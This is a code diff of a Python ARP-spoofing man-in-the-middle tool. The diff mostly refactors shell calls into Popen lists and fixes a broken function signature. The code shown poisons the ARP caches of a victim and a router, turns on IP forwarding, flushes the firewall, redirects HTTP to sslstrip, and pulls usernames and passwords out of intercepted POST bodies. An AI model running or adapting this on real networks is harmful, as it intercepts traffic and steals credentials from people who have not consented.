@@ -14,8 +14,6 @@ import sys
 import os
 import signal
 from subprocess import *
-import commands
-bash=commands.getoutput
 
 #Check if root
 if not os.geteuid()==0:
@@ -114,7 +112,7 @@ def originalMAC(ip):
 	for s,r in ans:
 		return r.sprintf("%Ether.src%")
 
-def poisonrouterIP, victimIP):
+def poison(routerIP, victimIP):
 	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff"))
 	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff"))
 
@@ -148,6 +146,7 @@ def URL(pkt):
 				post = l.split(' ')
 				post = post[1]
 
+		#If a packet with data is retrasmitted amongst multiple packets this will catch all the split up parts that are lacking in features of a normal packet
 		if args.post and len(pkt) < 450:
 			if body != '':
 				username = re.findall('(([Ee]mail|[Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
@@ -182,12 +181,6 @@ def URL(pkt):
 			url = host+post
 		if url == None:
 			return
-
-
-#The big unsolvable problem is that sometimes sniff() will get a packet (usually from the arp spoofed victim)
-#and split it into 2 packets when wireshark sees only one. Consistently from neopets via arpspoof victim. The load
-#gets truncated and sniff() then treats the other few lines of the HTTP load as a new packet for some reason.
-#http://bpaste.net/show/v2CsP4Ixzb7NGGuutDSp/
 
 		if args.post and post:
 			if body != '':
@@ -227,13 +220,6 @@ def URL(pkt):
 	post = None
 	url = None
 
-#def search(url):
-#	searched = re.search('((search|query|search\?q|\?s|&q)=([^&][^&]*))', url)
-#	if searched:
-#		searched = searched.group(3)
-#		searched = searched.replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
-#		print B + '[+] Searched %s for:' % c[1],searched + W
-
 def DNSreq(pkt):
 	if pkt.haslayer(DNSQR):
 		dnsreq = pkt[DNSQR].qname
@@ -270,12 +256,15 @@ class dnsspoof(threading.Thread):
 class sslstrip(threading.Thread):
 	def run(self):
 		print 'Redirecting traffic to port 10000 and starting sslstrip\n'
-		ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
-		sslstrip = bash('xterm -e sslstrip -f -w sslstrip.txt')
+		iptables = ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '10000']
+		Popen(iptables, stdout=PIPE, stderr=DN)
+		xterm = ['xterm', '-e', 'sslstrip', '-f', '-w', 'sslstrip.txt']
+		Popen(xterm, stdout=PIPE, stderr=DN)
 
 class driftnet(threading.Thread):
 	def run(self):
-		driftnet = bash('xterm -e driftnet -i %s' % interface)
+		xterm = ['xterm', '-e', 'driftnet', '-i', '%s' % interface]
+		Popen(xterm, stdout=PIPE, stderr=DN)
 
 try:
 	routerMAC = originalMAC(routerIP)
@@ -286,12 +275,14 @@ except:
 	sys.exit("Could not get MAC addresses")
 
 #Forward packets and flush iptables
-ipforward = bash('echo 1 > /proc/sys/net/ipv4/ip_forward')
-ipF = bash('iptables -F')
-ipNATF = bash('iptables -t nat F')
-ipX = bash('iptables -X')
-ipNATX = bash('iptables -t nat -X')
-print 'Enabled IP forwarding and flushed the firewall\n'
+f = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+f.write('1')
+f.close()
+Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
+Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
+Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
+Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
+print '[+] Enabled IP forwarding and flushed the firewall\n'
 
 def main():
 
@@ -325,14 +316,16 @@ def main():
 		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
 		restore(routerIP, victimIP, routerMAC, victimMAC)
 		restore(routerIP, victimIP, routerMAC, victimMAC)
-		bash('echo 0 > /proc/sys/net/ipv4/ip_forward')
-		bash('iptables -t nat -F')
-		bash('iptables -F')
-		bash('iptables -X')
+		f = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+		f.write('0')
+		f.close()
+		Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
+		Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
+		Popen(['iptables', '-X'], stdout=PIPE, stderr=DN)
+		Popen(['iptables', '-t', 'nat', '-X'], stdout=PIPE, stderr=DN)
 		sys.exit(0)
 
 	signal.signal(signal.SIGINT, signal_handler)
-
 
 	while 1:
 
